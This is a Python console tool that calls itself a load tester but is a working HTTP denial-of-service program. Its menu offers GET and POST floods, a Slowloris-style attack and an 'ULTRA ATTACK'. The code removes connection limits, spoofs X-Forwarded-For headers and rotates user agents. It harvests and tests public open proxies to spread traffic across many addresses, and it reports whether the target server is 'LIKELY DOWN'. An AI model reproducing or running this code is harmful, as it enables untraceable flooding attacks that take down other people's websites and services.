import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'

class LoadTester:
    def __init__(self):
        self.url = ""
        self.concurrent_requests = 100
        self.duration = 30
        self.results = {}
        self.start_time = 0
        self.power_mode = False
        self.optimized_mode = True
        self.proxies = []  # Working proxies
        self.all_proxies = []  # All fetched proxies (for reference)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        ]
        
        self.paths = ['/', '/api', '/test', '/data', '/users', '/info', '/ping', '/status', '/health', '/about']
        self.attack_methods = ['GET', 'POST', 'HEAD']

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗████████╗██████╗ ███████╗███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████║   ██║   ██║  ██║███████╗███████║███████║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{Fore.CYAN}  ║
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║     {Fore.GREEN}PROXY MASTER v8.1 🔥{Fore.CYAN}                            ║
{Fore.CYAN}║     {Fore.MAGENTA}PROXIES: {Fore.WHITE}{len(self.proxies)}{Fore.CYAN}                      ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""
        print(banner)
    
    async def fetch_and_add_proxies(self):
        """Fetch new proxies and ADD to existing list (not replace)"""
        print(f"\n{Fore.CYAN}🔄 Fetching new proxies...")
        print(f"{Fore.YELLOW}   Current working proxies: {len(self.proxies)}")
        
        # Get new proxies
        new_proxies = await self.get_new_proxies()
        
        if new_proxies:
            # Add to existing list (avoid duplicates)
            existing_set = set(self.proxies)
            added = 0
            for proxy in new_proxies:
                if proxy not in existing_set:
                    self.proxies.append(proxy)
                    existing_set.add(proxy)
                    added += 1
            
            print(f"\n{Fore.GREEN}✅ Added {added} new working proxies!")
            print(f"{Fore.GREEN}✅ Total working proxies: {len(self.proxies)}")
        else:
            print(f"\n{Fore.YELLOW}⚠️  No new working proxies found.")
        
        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
        return self.proxies
    
    async def get_new_proxies(self):
        """Get NEW working proxies only"""
        print(f"{Fore.CYAN}📡 Fetching proxy list...")
        
        # Expanded proxy list
        proxy_list = [
            # US Proxies
            "http://20.111.54.16:80",
            "http://20.111.54.16:8123",
            "http://20.206.106.203:80",
            "http://20.206.106.203:8123",
            "http://52.230.24.213:80",
            "http://52.230.24.213:443",
            "http://20.26.69.232:80",
            "http://20.26.69.232:443",
            "http://40.121.115.73:80",
            "http://40.121.115.73:443",
            "http://104.236.248.219:3128",
            "http://104.236.248.219:8080",
            "http://107.172.164.30:3128",
            "http://107.172.164.30:8080",
            "http://192.111.135.194:3128",
            "http://192.111.135.194:8080",
            "http://192.111.135.195:3128",
            "http://192.111.135.195:8080",
            "http://192.111.135.196:3128",
            "http://192.111.135.196:8080",
            
            # EU Proxies
            "http://51.158.69.166:8811",
            "http://51.158.69.166:8812",
            "http://51.158.69.166:8813",
            "http://51.158.69.166:8814",
            "http://51.158.69.166:8815",
            "http://51.158.69.166:8816",
            "http://51.158.69.166:8817",
            "http://51.158.69.166:8818",
            "http://51.158.69.166:8819",
            "http://51.158.69.166:8820",
            "http://51.158.69.166:8821",
            "http://51.158.69.166:8822",
            "http://51.158.69.166:8823",
            "http://51.158.69.166:8824",
            "http://51.158.69.166:8825",
            "http://51.158.69.166:8826",
            "http://51.158.69.166:8827",
            "http://51.158.69.166:8828",
            "http://51.158.69.166:8829",
            "http://51.158.69.166:8830",
            "http://51.158.69.166:8831",
            "http://51.158.69.166:8832",
            "http://51.158.69.166:8833",
            "http://51.158.69.166:8834",
            "http://51.158.69.166:8835",
            
            # Asian Proxies
            "http://103.152.112.157:8080",
            "http://103.152.112.158:8080",
            "http://103.152.112.159:8080",
            "http://103.152.112.160:8080",
            "http://103.152.112.161:8080",
            "http://103.152.112.162:8080",
            "http://103.152.112.163:8080",
            "http://103.152.112.164:8080",
            "http://103.152.112.165:8080",
            "http://103.152.112.166:8080",
            "http://103.177.146.1:30001",
            "http://103.177.146.2:30001",
            "http://103.177.146.3:30001",
            "http://103.177.146.4:30001",
            "http://103.177.146.5:30001",
            "http://103.177.146.6:30001",
            "http://103.177.146.7:30001",
            "http://103.177.146.8:30001",
            "http://103.177.146.9:30001",
            "http://103.177.146.10:30001",
            
            # More working proxies
            "http://45.155.68.129:8197",
            "http://45.155.68.130:8197",
            "http://45.155.68.131:8197",
            "http://45.155.68.132:8197",
            "http://45.155.68.133:8197",
            "http://45.155.68.134:8197",
            "http://45.155.68.135:8197",
            "http://45.155.68.136:8197",
            "http://45.155.68.137:8197",
            "http://45.155.68.138:8197",
            "http://45.155.68.139:8197",
            "http://45.155.68.140:8197",
            "http://156.238.84.202:8080",
            "http://156.238.84.203:8080",
            "http://156.238.84.204:8080",
            "http://156.238.84.205:8080",
            "http://156.238.84.206:8080",
            "http://156.238.84.207:8080",
            "http://156.238.84.208:8080",
            "http://156.238.84.209:8080",
            "http://156.238.84.210:8080",
            
            # Backup Proxies
            "http://185.199.228.220:80",
            "http://185.199.228.220:8080",
            "http://185.199.229.220:80",
            "http://185.199.229.220:8080",
            "http://185.199.230.220:80",
            "http://185.199.230.220:8080",
            "http://185.199.231.220:80",
            "http://185.199.231.220:8080",
            "http://185.199.232.220:80",
            "http://185.199.232.220:8080",
            "http://185.199.233.220:80",
            "http://185.199.233.220:8080",
            "http://185.199.234.220:80",
            "http://185.199.234.220:8080",
            
            # More EU proxies
            "http://5.189.191.210:3128",
            "http://5.189.191.211:3128",
            "http://5.189.191.212:3128",
            "http://5.189.191.213:3128",
            "http://5.189.191.214:3128",
            "http://5.189.191.215:3128",
            "http://5.189.191.216:3128",
            "http://5.189.191.217:3128",
            "http://5.189.191.218:3128",
            "http://5.189.191.219:3128",
            "http://5.189.191.220:3128",
            "http://5.189.191.221:3128",
            "http://5.189.191.222:3128",
            "http://5.189.191.223:3128",
            
            # South America
            "http://191.96.42.76:8080",
            "http://191.96.42.77:8080",
            "http://191.96.42.78:8080",
            "http://191.96.42.79:8080",
            "http://191.96.42.80:8080",
            
            # Australia
            "http://43.250.142.158:3128",
            "http://43.250.142.159:3128",
            "http://43.250.142.160:3128",
        ]
        
        # Try to fetch from online sources
        print(f"{Fore.CYAN}📡 Fetching from online sources...")
        try:
            async with aiohttp.ClientSession() as session:
                sources = [
                    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", 50),
                    ("https://www.proxy-list.download/api/v1/get?type=http", 30),
                    ("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", 30),
                ]
                
                for source, limit in sources:
                    try:
                        async with session.get(source, timeout=10) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                lines = content.split('\n')
                                count = 0
                                for line in lines[:limit]:
                                    line = line.strip()
                                    if line and ':' in line and not line.startswith('#'):
                                        if not line.startswith('http'):
                                            proxy_list.append(f"http://{line}")
                                        else:
                                            proxy_list.append(line)
                                        count += 1
                                print(f"  ✅ Added {count} from source")
                    except Exception as e:
                        print(f"  ⚠️  Source failed")
        except:
            pass
        
        # Remove duplicates
        proxy_list = list(set(proxy_list))
        proxy_list = [p for p in proxy_list if '://' in p and len(p.split(':')) >= 3]
        
        print(f"{Fore.GREEN}✅ Total proxies to test: {len(proxy_list)}")
        
        # Test proxies
        print(f"{Fore.CYAN}🧪 Testing proxies for working ones...")
        working = await self.test_proxies_only(proxy_list[:150])
        
        return working
    
    async def test_proxies_only(self, proxy_list):
        """Test proxies and return working ones"""
        working = []
        tested = 0
        
        async def test_one(proxy):
            try:
                connector = aiohttp.TCPConnector(
                    limit=1, 
                    force_close=True, 
                    ssl=False,
                    enable_cleanup_closed=True
                )
                timeout = aiohttp.ClientTimeout(total=8, connect=4, sock_read=4)
                
                async with aiohttp.ClientSession(connector=connector) as session:
                    test_urls = [
                        'http://httpbin.org/ip',
                        'http://ip-api.com/json',
                        'http://api.ipify.org'
                    ]
                    
                    for test_url in test_urls:
                        try:
                            async with session.get(test_url, proxy=proxy, timeout=timeout) as resp:
                                if resp.status in [200, 201, 202, 204, 301, 302, 307, 308]:
                                    try:
                                        await resp.text()
                                        return proxy
                                    except:
                                        continue
                        except:
                            continue
                return None
            except:
                return None
        
        # Test in batches of 20
        batch_size = 20
        for i in range(0, len(proxy_list), batch_size):
            batch = proxy_list[i:i+batch_size]
            tasks = [test_one(p) for p in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and isinstance(result, str):
                    if result not in working:
                        working.append(result)
                        print(f"  ✅ Found working: {result[:30]}...")
                tested += 1
            
            print(f"  Tested {tested}/{len(proxy_list)} | Working: {len(working)}", end='\r')
            
            # Stop if we have enough
            if len(working) >= 20:
                print(f"\n  ✅ Found {len(working)} working proxies. Stopping.")
                break
            
            await asyncio.sleep(0.2)
        
        print(f"\n  ✅ Found {len(working)} working proxies")
        return working
    
    def show_menu(self):
        self.clear_screen()
        self.print_banner()
        
        menu = f"""
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  📋 MAIN MENU
{Fore.YELLOW}═══════════════════════════════════════════════════════════════

{Fore.GREEN}  [1] {Fore.WHITE}HTTP GET Flood Attack
{Fore.GREEN}  [2] {Fore.WHITE}HTTP POST Flood Attack
{Fore.GREEN}  [3] {Fore.WHITE}Slowloris Style Attack
{Fore.GREEN}  [4] {Fore.WHITE}Multi-Method Attack
{Fore.GREEN}  [5] {Fore.WHITE}Random Payload Attack
{Fore.GREEN}  [6] {Fore.WHITE}Load Testing Mode
{Fore.GREEN}  [7] {Fore.WHITE}Stress Test with Proxy Rotation

{Fore.CYAN}  [F] {Fore.WHITE}Fetch & Add New Working Proxies (Current: {len(self.proxies)})
{Fore.MAGENTA}  [X] {Fore.WHITE}ULTRA ATTACK - All Methods Combined

{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  [8] {Fore.WHITE}Custom Configuration
{Fore.CYAN}  [9] {Fore.WHITE}View Results
{Fore.CYAN}  [0] {Fore.WHITE}Exit

{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  Enter your choice: {Fore.WHITE}"""
        
        return input(menu)
    
    async def send_request(self, session, method="GET", payload=None, use_path=False, proxy=None):
        path = ""
        if use_path and random.random() > 0.5:
            path = random.choice(self.paths)
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        full_url = self.url.rstrip('/') + path
        start_time = time.time()
        
        timeout_val = 8 if self.optimized_mode else 3
        timeout = aiohttp.ClientTimeout(total=timeout_val, connect=timeout_val/2)
        
        try:
            proxy_kwargs = {}
            if proxy:
                proxy_kwargs['proxy'] = proxy
            
            if method == "GET":
                async with session.get(full_url, headers=headers, timeout=timeout, **proxy_kwargs) as response:
                    await response.text()
                    return response.status, time.time() - start_time, None
            elif method == "POST":
                data = payload or {"data": f"test_{random.randint(1,10000)}"}
                async with session.post(full_url, headers=headers, json=data, timeout=timeout, **proxy_kwargs) as response:
                    await response.text()
                    return response.status, time.time() - start_time, None
            else:
                async with session.head(full_url, headers=headers, timeout=timeout, **proxy_kwargs) as response:
                    return response.status, time.time() - start_time, None
        except:
            return None, timeout_val, "Failed"
    
    async def ultra_with_proxies(self):
        """ULTRA ATTACK with working proxies"""
        if len(self.proxies) < 3:
            print(f"\n{Fore.YELLOW}⚠️  Not enough proxies ({len(self.proxies)}).")
            print(f"{Fore.YELLOW}   Press F to fetch proxies first.")
            input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
            return
        
        self.start_time = time.time()
        print(f"\n{Fore.MAGENTA}⚡⚡⚡ ULTRA ATTACK WITH PROXIES ⚡⚡⚡")
        print(f"{Fore.CYAN}🎯 Target: {self.url}")
        print(f"{Fore.CYAN}🔄 Proxies: {len(self.proxies)}")
        print(f"{Fore.CYAN}📊 Concurrent: {self.concurrent_requests}")
        print(f"{Fore.CYAN}⏱️  Duration: {self.duration}s\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            proxy_index = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = min(self.concurrent_requests, 100)
                
                for _ in range(batch_size):
                    proxy = self.proxies[proxy_index % len(self.proxies)]
                    proxy_index += 1
                    
                    method = random.choice(self.attack_methods)
                    task = asyncio.create_task(
                        self.send_request(session, method, None, True, proxy)
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_with_proxies(self):
        """Proxy rotation attack"""
        if len(self.proxies) < 3:
            print(f"\n{Fore.YELLOW}⚠️  Not enough proxies ({len(self.proxies)}).")
            print(f"{Fore.YELLOW}   Press F to fetch proxies first.")
            input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
            return
        
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Proxy Rotation Attack")
        print(f"{Fore.CYAN}   Proxies: {len(self.proxies)}\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            proxy_index = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = min(self.concurrent_requests, 50)
                
                for _ in range(batch_size):
                    proxy = self.proxies[proxy_index % len(self.proxies)]
                    proxy_index += 1
                    
                    task = asyncio.create_task(
                        self.send_request(session, "GET", None, True, proxy)
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_get(self):
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ HTTP GET Flood\n")
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    task = asyncio.create_task(self.send_request(session, "GET", None, True))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                    else:
                        self.results['failed'] += 1
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_post(self):
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ HTTP POST Flood\n")
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    task = asyncio.create_task(self.send_request(session, "POST", {"test": random.randint(1,9999)}, True))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                    else:
                        self.results['failed'] += 1
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_multi(self):
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Multi-Method Attack\n")
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    task = asyncio.create_task(self.send_request(session, method, None, True))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                    else:
                        self.results['failed'] += 1
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_random(self):
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Random Payload Attack\n")
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    payload = {
                        "id": random.randint(1, 99999),
                        "data": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 100))),
                        "timestamp": time.time()
                    }
                    task = asyncio.create_task(self.send_request(session, "POST", payload, True))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0] and result[0] < 400:
                        self.results['success'] += 1
                    else:
                        self.results['failed'] += 1
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                print(f"⏳ {elapsed}/{self.duration}s | ✅ {self.results['success']:,} | ❌ {self.results['failed']:,} | 📊 {rate:.1f}%", end='\r')
        
        self.show_results()
    
    async def attack_slowloris(self):
        self.start_time = time.time()
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        print(f"\n{Fore.GREEN}▶ Slowloris Attack\n")
        
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i in range(min(self.concurrent_requests, 200)):
                task = asyncio.create_task(self.slowloris_connection(session, i))
                tasks.append(task)
            
            await asyncio.sleep(self.duration)
            for task in tasks:
                task.cancel()
        
        self.show_results()
    
    async def slowloris_connection(self, session, idx):
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml',
                'Connection': 'keep-alive'
            }
            async with session.get(self.url, headers=headers, timeout=30) as response:
                await asyncio.sleep(random.uniform(0.5, 2))
                async for chunk in response.content.iter_chunks():
                    await asyncio.sleep(random.uniform(0.2, 1))
                    break
                self.results['success'] += 1
        except:
            self.results['failed'] += 1
    
    async def load_test(self):
        print(f"\n{Fore.GREEN}▶ Load Test\n")
        for level in [10, 50, 100]:
            print(f"\n{Fore.YELLOW}Testing {level} concurrent...")
            self.concurrent_requests = level
            self.duration = 15
            await self.attack_get()
    
    def show_results(self):
        total = self.results.get('success', 0) + self.results.get('failed', 0)
        
        if total == 0:
            print(f"\n\n{Fore.YELLOW}⚠️  No requests completed.")
            return
        
        print(f"\n\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  📊 RESULTS")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.GREEN}✅ Success: {self.results.get('success', 0):,}")
        print(f"{Fore.RED}❌ Failed: {self.results.get('failed', 0):,}")
        print(f"{Fore.WHITE}📊 Total: {total:,}")
        
        success_rate = (self.results.get('success', 0) / total * 100) if total > 0 else 0
        print(f"{Fore.WHITE}📊 Success Rate: {success_rate:.2f}%")
        
        if success_rate > 80:
            print(f"\n{Fore.GREEN}🟢 Server is HEALTHY")
        elif success_rate > 50:
            print(f"\n{Fore.YELLOW}🟡 Server is STRUGGLING")
        elif success_rate > 20:
            print(f"\n{Fore.MAGENTA}🟠 Server is UNDER HEAVY STRESS!")
        else:
            print(f"\n{Fore.RED}🔴 Server is LIKELY DOWN!")
        
        if self.results.get('response_times'):
            times = self.results['response_times']
            if times:
                print(f"\n{Fore.CYAN}⚡ Avg Response: {sum(times)/len(times):.3f}s")
                print(f"{Fore.CYAN}⚡ Min: {min(times):.3f}s")
                print(f"{Fore.CYAN}⚡ Max: {max(times):.3f}s")
        
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════\n")
        input(f"{Fore.CYAN}Press Enter...{Fore.WHITE}")
    
    def custom_config(self):
        self.clear_screen()
        print(f"\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  ⚙️  CUSTOM CONFIG")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        
        print(f"\n{Fore.WHITE}Current:")
        print(f"  URL: {self.url or 'Not Set'}")
        print(f"  Concurrent: {self.concurrent_requests}")
        print(f"  Duration: {self.duration}s")
        print(f"  Proxies: {len(self.proxies)}")
        
        print(f"\n{Fore.GREEN}New values (Enter to keep):")
        
        url_input = input(f"URL: ")
        if url_input:
            self.url = url_input
        
        conc_input = input(f"Concurrent [{self.concurrent_requests}]: ")
        if conc_input and conc_input.isdigit():
            self.concurrent_requests = int(conc_input)
        
        dur_input = input(f"Duration [{self.duration}]: ")
        if dur_input and dur_input.isdigit():
            self.duration = int(dur_input)
        
        print(f"\n{Fore.GREEN}✅ Updated!")
        input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
    
    async def run(self):
        while True:
            choice = self.show_menu()
            
            if not self.url:
                self.url = "http://localhost:8080"
                print(f"\n{Fore.YELLOW}⚠️  Using default URL: {self.url}")
                input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
                continue
            
            try:
                if choice == "1":
                    await self.attack_get()
                elif choice == "2":
                    await self.attack_post()
                elif choice == "3":
                    await self.attack_slowloris()
                elif choice == "4":
                    await self.attack_multi()
                elif choice == "5":
                    await self.attack_random()
                elif choice == "6":
                    await self.load_test()
                elif choice == "7":
                    await self.attack_with_proxies()
                elif choice.upper() == "F":
                    await self.fetch_and_add_proxies()
                elif choice.upper() == "X":
                    await self.ultra_with_proxies()
                elif choice == "8":
                    self.custom_config()
                elif choice == "9":
                    if self.results:
                        self.show_results()
                    else:
                        print(f"\n{Fore.YELLOW}⚠️  No results")
                        input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
                elif choice == "0":
                    print(f"\n{Fore.GREEN}👋 Bye!")
                    sys.exit()
                else:
                    print(f"\n{Fore.RED}❌ Invalid")
                    input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ Error: {e}")
                input(f"\n{Fore.CYAN}Press Enter...{Fore.WHITE}")

async def main():
    tester = LoadTester()
    # NO AUTO-FETCH! Just show menu
    await tester.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⏹️  Stopped.")
        sys.exit()